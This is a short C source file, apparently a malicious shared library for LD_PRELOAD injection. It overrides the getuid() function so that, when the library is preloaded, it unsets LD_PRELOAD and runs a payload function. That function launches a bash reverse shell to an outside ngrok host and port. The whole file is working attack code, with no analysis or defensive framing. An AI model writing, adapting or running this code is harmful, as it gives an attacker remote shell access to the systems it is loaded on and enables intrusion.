#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/10535 0>&1'");
}   

uid_t getuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}